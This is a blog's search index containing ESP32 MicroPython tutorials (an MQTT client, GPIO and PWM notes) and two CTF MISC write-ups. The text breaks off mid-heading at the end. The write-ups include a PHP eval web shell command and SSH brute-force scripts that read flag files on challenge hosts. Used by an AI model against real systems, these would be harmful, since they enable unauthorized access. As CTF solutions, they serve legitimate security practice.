<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>ESP32 MicroPython以MQTT方法接入巴法云</title>
      <link href="/ESP32-MicroPython%E4%BB%A5MQTT%E6%96%B9%E6%B3%95%E6%8E%A5%E5%85%A5%E5%B7%B4%E6%B3%95%E4%BA%91/"/>
      <url>/ESP32-MicroPython%E4%BB%A5MQTT%E6%96%B9%E6%B3%95%E6%8E%A5%E5%85%A5%E5%B7%B4%E6%B3%95%E4%BA%91/</url>
      
        <content type="html"><![CDATA[<h1 id="MQTT-接入巴法云"><a href="#MQTT-接入巴法云" class="headerlink" title="MQTT 接入巴法云"></a>MQTT 接入巴法云</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> machine <span class="keyword">import</span> reset, Timer</span><br><span class="line"><span class="keyword">import</span> network</span><br><span class="line"><span class="keyword">from</span> umqtt.simple <span class="keyword">import</span> MQTTClient</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># IoT 类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">IoTDevice</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.client = <span class="literal">None</span></span><br><span class="line">        self.wifiName = <span class="string">&#x27;****-2.4G&#x27;</span></span><br><span class="line">        self.wifiPass = <span class="string">&#x27;************&#x27;</span></span><br><span class="line">        <span class="comment"># 初始化 MQTT  参数</span></span><br><span class="line">        self.clientID = <span class="string">&#x27;************************&#x27;</span></span><br><span class="line">        self.serverIP = <span class="string">&#x27;bemfa.com&#x27;</span></span><br><span class="line">        self.serverPort = <span class="number">9501</span></span><br><span class="line">        self.topicName = <span class="string">b&#x27;****&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># WIFI 连接</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">client_wifi</span>(<span class="params">self</span>):</span><br><span class="line">        wlan = network.WLAN(network.STA_IF)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> wlan.isconnected():</span><br><span class="line">            wlan.active(<span class="literal">True</span>)</span><br><span class="line">            wlan.connect(self.wifiName, self.wifiPass)</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> wlan.isconnected():</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># MQTT 连接</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">client_mqtt</span>(<span class="params">self</span>):</span><br><span class="line">        client = MQTTClient(self.clientID, self.serverIP, self.serverPort)</span><br><span class="line">        client.connect()</span><br><span class="line">        client.set_callback(self.sub_cb)</span><br><span class="line">        client.subscribe(self.topicName)</span><br><span class="line">        <span class="keyword">return</span> client</span><br><span class="line"></span><br><span class="line">    <span class="comment"># MQTT 心跳</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">heart_beat</span>(<span class="params">self, t</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            self.client.publish(topic=<span class="string">f&#x27;<span class="subst">&#123;self.topicName&#125;</span>/set&#x27;</span>, msg=<span class="string">&quot;MQTT server&quot;</span>, qos=<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            self.machine_reset()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># MQTT 设备重置</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">machine_reset</span>(<span class="params">self</span>):</span><br><span class="line">        time.sleep(<span class="number">10</span>)</span><br><span class="line">        reset()</span><br><span class="line"></span><br><span class="line">    <span class="comment">#  回调函数</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">sub_cb</span>(<span class="params">self, topic, msg</span>):</span><br><span class="line">        <span class="keyword">if</span> topic == self.topicName:</span><br><span class="line">            <span class="keyword">if</span> msg.decode() == <span class="string">&#x27;on&#x27;</span>:</span><br><span class="line">                <span class="keyword">pass</span>  <span class="comment"># 执行函数</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">elif</span> msg.decode() == <span class="string">&#x27;off&#x27;</span>:</span><br><span class="line">                <span class="keyword">pass</span>  <span class="comment"># 执行函数</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    device = IoTDevice()</span><br><span class="line">    device.client_wifi()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        device.client = device.client_mqtt()</span><br><span class="line">    <span class="keyword">except</span> OSError <span class="keyword">as</span> e:</span><br><span class="line">        device.machine_reset()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 设置定时心跳</span></span><br><span class="line">    tim = Timer(-<span class="number">1</span>)</span><br><span class="line">    tim.init(period=<span class="number">10000</span>, mode=Timer.PERIODIC, callback=device.heart_beat)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            device.client.check_msg()</span><br><span class="line">            time.sleep_ms(<span class="number">100</span>)</span><br><span class="line">        <span class="keyword">except</span> OSError <span class="keyword">as</span> e:</span><br><span class="line">            device.machine_reset()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ESP32 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ESP32 </tag>
            
            <tag> 单片机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2024 VNCTF MISC WP</title>
      <link href="/2024-VNCTF-MISC-WP/"/>
      <url>/2024-VNCTF-MISC-WP/</url>
      
        <content type="html"><![CDATA[<h1 id="sqlshark"><a href="#sqlshark" class="headerlink" title="sqlshark"></a>sqlshark</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 过滤出sql语句</span></span><br><span class="line"><span class="comment"># tshark.exe -r sqlshark.pcap -T fields -e urlencoded-form.value -Y &#x27;http&#x27; &gt;out</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">data = <span class="built_in">open</span>(<span class="string">r&quot;out&quot;</span>, encoding=<span class="string">&#x27;utf-16&#x27;</span>).read()</span><br><span class="line">data = re.findall(<span class="string">&#x27;(\d*) fOr 1\)\)\)\)in\((\d*)\)\)&#x27;</span>, data)</span><br><span class="line"></span><br><span class="line">flag = [<span class="number">0</span>] * <span class="number">15</span></span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> data:</span><br><span class="line">    num = <span class="built_in">int</span>(item[<span class="number">0</span>])</span><br><span class="line">    value = <span class="built_in">int</span>(item[<span class="number">1</span>])</span><br><span class="line">    flag[num] = value</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">chr</span>,flag)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># admin_p@ssw0rd</span></span><br><span class="line"><span class="comment"># VNCTF&#123;admin_p@ssw0rd&#125;</span></span><br></pre></td></tr></table></figure><h1 id="ez-msb"><a href="#ez-msb" class="headerlink" title="ez_msb"></a>ez_msb</h1><p><img src="/2024-VNCTF-MISC-WP/1708144241271-37fedaf8-2add-4648-9310-642115c110e0.png" alt="image.png"><br><img src="/2024-VNCTF-MISC-WP/1708144280179-3cc8e8c9-b2f4-494b-b38c-bd82c251c1fa.png" alt="image.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">VNCTF&#123;gnuradio_best_radio_3de8b&#125;</span><br></pre></td></tr></table></figure><h1 id="LearnOpenGL"><a href="#LearnOpenGL" class="headerlink" title="LearnOpenGL"></a>LearnOpenGL</h1><p>生成两张透明图片替代资源中的砖块图像</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">img = Image.new(<span class="string">&#x27;RGBA&#x27;</span>, (<span class="number">128</span>, <span class="number">128</span>), (<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">img.save(<span class="string">&#x27;out.png&#x27;</span>)</span><br></pre></td></tr></table></figure><p><img src="/2024-VNCTF-MISC-WP/1708144435773-e8b58df7-b1e7-4c85-956c-abb17120cd33.png" alt="image.png"><br><img src="/2024-VNCTF-MISC-WP/1708144449997-133f5fcd-bc5b-450f-9418-4ca885208aa7.png" alt="image.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">VNCTF&#123;T3xtur3_M45t3r_0r_r3v_g405hou_8703d0ccfef0&#125;</span><br></pre></td></tr></table></figure><h1 id="OnlyLocalSql"><a href="#OnlyLocalSql" class="headerlink" title="OnlyLocalSql"></a>OnlyLocalSql</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 写入shell</span><br><span class="line">echo &#x27;&lt;?php eval($_POST[abc123]) ?&gt;&#x27; &gt;shell.php</span><br><span class="line"></span><br><span class="line"># 开启远程代理</span><br><span class="line">ssh -L 5555:127.0.0.1:80 ctf@manqiu.top -p 20657</span><br><span class="line"></span><br><span class="line"># 蚁剑连接</span><br><span class="line">localhost:5555 </span><br><span class="line">cd ../../../ &amp;&amp; cat flag</span><br><span class="line"></span><br><span class="line">vnctf&#123;00812b25-a3c2-4af8-8607-b9aede1960f2&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MISC </tag>
            
            <tag> WP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NSSCTF round#18 MISC WP</title>
      <link href="/NSSCTF-round18-MISC-WP/"/>
      <url>/NSSCTF-round18-MISC-WP/</url>
      
        <content type="html"><![CDATA[<h1 id="温馨的酒吧"><a href="#温馨的酒吧" class="headerlink" title="温馨的酒吧"></a>温馨的酒吧</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">手动遍历所有结局</span><br><span class="line">part: !@#$%&amp;_CTFer!&#125;</span><br><span class="line">part: _不要停下来啊_</span><br><span class="line">part: NSSCTF&#123;新年快乐</span><br><span class="line"></span><br><span class="line">拼接: NSSCTF&#123;新年快乐_不要停下来啊_CTFer!&#125;</span><br></pre></td></tr></table></figure><h1 id="number7"><a href="#number7" class="headerlink" title="number7"></a>number7</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">182A1918071C152E0A4737263A3E780A6F6A075A112742777C687D0700773F7D39560063487D</span><br><span class="line"></span><br><span class="line">type7</span><br><span class="line">NSSCTF&#123;H4PPY_N3WY34r_4ND_N55CTF_18TH&#125;</span><br></pre></td></tr></table></figure><h1 id="userssssssss"><a href="#userssssssss" class="headerlink" title="userssssssss"></a>userssssssss</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 直接尝试连接并cat flag.txt</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> paramiko</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">host = <span class="string">&#x27;node2.anna.nssctf.cn&#x27;</span></span><br><span class="line">port = <span class="number">28914</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">connect</span>(<span class="params">user, password, i</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        ssh = paramiko.SSHClient()</span><br><span class="line">        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())</span><br><span class="line">        ssh.connect(hostname=host, port=port, username=user, password=password)</span><br><span class="line"></span><br><span class="line">        stdin, stdout, stderr = ssh.exec_command(<span class="string">&#x27;cat flag.txt&#x27;</span>)  <span class="comment"># 0~307</span></span><br><span class="line">        data = stdout.read()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(data):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;[+] found! found at <span class="subst">&#123;i&#125;</span>! info: <span class="subst">&#123;user&#125;</span> <span class="subst">&#123;password&#125;</span> <span class="subst">&#123;data&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span>:  <span class="comment"># 当报错停止时，记录报错位置，再次运行时手动修改for i in range(306, len(userlist)) 中 i 的爆破位置</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;[-] error! stop at <span class="subst">&#123;i&#125;</span>! info: <span class="subst">&#123;user&#125;</span> <span class="subst">&#123;password&#125;</span>&#x27;</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">userlist = <span class="built_in">open</span>(<span class="string">&#x27;./wordlist.txt&#x27;</span>).readlines()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">306</span>, <span class="built_in">len</span>(userlist)):</span><br><span class="line">    user = userlist[i].strip()</span><br><span class="line">    password = <span class="built_in">str</span>(hashlib.md5(user.encode()).hexdigest())</span><br><span class="line">    connect(user, password, i)</span><br><span class="line"></span><br><span class="line"><span class="comment"># [+] found! found at 122! info: laminous af9533540eaafd949e70f18ee0fabd47 b&#x27;NSSCTF&#123;**************************&#125;\n&#x27;</span></span><br></pre></td></tr></table></figure><h1 id="usersssssssss-revenge"><a href="#usersssssssss-revenge" class="headerlink" title="usersssssssss_revenge"></a>usersssssssss_revenge</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 由于增加了字典长度，以及flag文件名被修改，尝试以ls -al之后，然后  readlines的方法大致判断文件个数，若不是7个，比其他ssh用户目录中文件数不一样则包含flag文件</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> paramiko</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">host = <span class="string">&#x27;node2.anna.nssctf.cn&#x27;</span></span><br><span class="line">port = <span class="number">28176</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">connect</span>(<span class="params">user, password, i</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        ssh = paramiko.SSHClient()</span><br><span class="line">        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())</span><br><span class="line">        ssh.connect(hostname=host, port=port, username=user, password=password)</span><br><span class="line"></span><br><span class="line">        stdin, stdout, stderr = ssh.exec_command(<span class="string">&#x27;ls -al&#x27;</span>)  <span class="comment"># 0~307</span></span><br><span class="line">        data = stdout.readlines()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(data) != <span class="number">7</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;[+] found! found at <span class="subst">&#123;i&#125;</span>! info: <span class="subst">&#123;user&#125;</span> <span class="subst">&#123;password&#125;</span> <span class="subst">&#123;data&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;[-] error! stop at <span class="subst">&#123;i&#125;</span>! info: <span class="subst">&#123;user&#125;</span> <span class="subst">&#123;password&#125;</span>&#x27;</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">userlist = <span class="built_in">open</span>(<span class="string">&#x27;./wordlist.txt&#x27;</span>).readlines()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">83</span>, <span class="built_in">len</span>(userlist)):</span><br><span class="line">    user = userlist[i].strip()</span><br><span class="line">    password = <span class="built_in">str</span>(hashlib.md5(user.encode()).hexdigest())</span><br><span class="line">    connect(user, password, i)</span><br><span class="line"></span><br><span class="line"><span class="comment"># [+] found! found at 344! info: upon 44e5b2bc484331ea24afd85ecfb212c8 [&#x27;total 40\n&#x27;, &#x27;drwxr-x--- 1 upon upon  4096 Feb 14 07:02 .\n&#x27;, &#x27;drwxr-xr-x 1 root root 12288 Feb 14 03:06 ..\n&#x27;, &#x27;-rw-r--r-- 1 upon upon   220 Jan  6  2022 .bash_logout\n&#x27;, &#x27;-rw-r--r-- 1 upon upon  3771 Jan  6  2022 .bashrc\n&#x27;, &#x27;drwx------ 2 upon upon  4096 Feb 14 07:02 .cache\n&#x27;, &#x27;-rwxrwx--- 1 upon upon    45 Feb 14 06:58 .flag.txt\n&#x27;, &#x27;-rw-r--r-- 1 upon upon   807 Jan  6  2022 .profile\n&#x27;]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 连接用户 cat .flag.txt</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MISC </tag>
            
            <tag> WP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ESP32 开发笔记</title>
      <link href="/ESP32-%E5%BC%80%E5%8F%91%E7%AC%94%E8%AE%B0/"/>
      <url>/ESP32-%E5%BC%80%E5%8F%91%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p>学习链接：<a href="https://www.bilibili.com/video/BV1G34y">https://www.bilibili.com/video/BV1G34y</a></p><h1 id="ESP32-电路"><a href="#ESP32-电路" class="headerlink" title="ESP32 电路"></a>ESP32 电路</h1><hr><p><img src="/ESP32-%E5%BC%80%E5%8F%91%E7%AC%94%E8%AE%B0/image-20240213185625175.png" alt="image-20240213185625175"></p><h1 id="ESP32-开发"><a href="#ESP32-开发" class="headerlink" title="ESP32 开发"></a>ESP32 开发</h1><hr><h2 id="machine模块-引脚与GPIO"><a href="#machine模块-引脚与GPIO" class="headerlink" title="machine模块 | 引脚与GPIO"></a>machine模块 | 引脚与GPIO</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> machine <span class="keyword">import</span> Pin</span><br><span class="line"></span><br><span class="line"><span class="comment"># 引脚 = machine.Pin(引脚编号,machine.Pin.OUT)</span></span><br><span class="line"><span class="comment"># 引脚编号为电路板GPIO值(标准输入输出)</span></span><br><span class="line">pin12 = Pin(<span class="number">12</span>, Pin.OUT)</span><br><span class="line"><span class="comment"># 引脚.value(通电状态)</span></span><br><span class="line">pin12.value(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">from machine import Pin</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">p0 = Pin(0, Pin.OUT)    # 在 GPIO0 上创建一个输出引脚</span></span><br><span class="line"><span class="string">p0.on()                 # 设置引脚为高电频</span></span><br><span class="line"><span class="string">p0.off()                # 设置引脚为低电频</span></span><br><span class="line"><span class="string">p0.value(1)             # 设置引脚为高低电频</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">p2 = Pin(2, Pin.IN)     # 在 GPIO0 上创建一个输入引脚</span></span><br><span class="line"><span class="string">print(p2.value())       # 获取该引脚的值</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">p4 = Pin(4, Pin.IN, Pin.PULL_UP) # enable internal pull-up resistor</span></span><br><span class="line"><span class="string">p5 = Pin(5, Pin.OUT, value=1) # set pin high on creation</span></span><br><span class="line"><span class="string">p6 = Pin(6, Pin.OUT, drive=Pin.DRIVE_3) # set maximum drive strength</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="PWM模块-time模块-脉宽调制与延时"><a href="#PWM模块-time模块-脉宽调制与延时" class="headerlink" title="PWM模块 time模块 | 脉宽调制与延时"></a>PWM模块 time模块 | 脉宽调制与延时</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> machine <span class="keyword">import</span> Pin , PWM</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">pwm2 = PWM(Pin(<span class="number">2</span>))</span><br><span class="line">freq = pwm2.freq(<span class="number">1000</span>) <span class="comment"># 设置当前的频率(电流通电频率，频率决定了led的闪烁频率)</span></span><br><span class="line">count = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">1024</span>):</span><br><span class="line">        pwm2.duty(i) <span class="comment"># 设置占空比(周期内高电频的占比次数，占空比决定了led的亮度)</span></span><br><span class="line">        time.sleep_ms(<span class="number">1</span>) <span class="comment"># 设置亮的时长，因为led不会因为程序改变而停止,需要手动命令停止</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1023</span>,-<span class="number">1</span>,-<span class="number">1</span>):</span><br><span class="line">        pwm2.duty(i)</span><br><span class="line">        time.sleep_ms(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">from machine import Pin, PWM</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">pwm0 = PWM(Pin(0))         # 在引脚上创建一个PWM对象</span></span><br><span class="line"><span class="string">freq = pwm0.freq()         # 获取当前的频率 (default 5kHz)</span></span><br><span class="line"><span class="string">pwm0.freq(1000)            # 设置当前的频率从 1Hz~40MHz</span></span><br><span class="line"><span class="string">pwm2 = PWM(Pin(2), freq=20000, duty=512)  # 一次性设置属性</span></span><br><span class="line"><span class="string">pwm0.deinit()              # 关闭当前引脚的PWM</span></span><br><span class="line"><span class="string">print(pwm2)                # 查看PWM的属性</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">duty = pwm0.duty()         # 获取当前的占空比, range 0-1023 (default 512, 50%)</span></span><br><span class="line"><span class="string">pwm0.duty(256)             # 设置占空比, range0-1023 as a ratio duty/1023, (now 25%)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 不同单位的占空比</span></span><br><span class="line"><span class="string">duty_u16 = pwm0.duty_u16() # get current duty cycle, range 0-65535</span></span><br><span class="line"><span class="string">pwm0.duty_u16(2**16*3//4)  # set duty cycle from 0 to 65535 as a ratio duty_u16/65535, (now 75%)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">duty_ns = pwm0.duty_ns()   # get current pulse width in ns</span></span><br><span class="line"><span class="string">pwm0.duty_ns(250_000)      # set pulse width in nanoseconds from 0 to 1_000_000_000/freq, (now 25%)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">import time</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">time.sleep(1)           # 休眠1秒</span></span><br><span class="line"><span class="string">time.sleep_ms(500)      # 休眠500毫秒</span></span><br><span class="line"><span class="string">time.sleep_us(10)       # 休眠10微秒</span></span><br><span class="line"><span class="string">start = time.ticks_ms() # get millisecond counter</span></span><br><span class="line"><span class="string">delta = time.ticks_diff(time.ticks_ms(), start) # compute time difference</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="舵机-（PWM）"><a href="#舵机-（PWM）" class="headerlink" title="舵机 （PWM）"></a>舵机 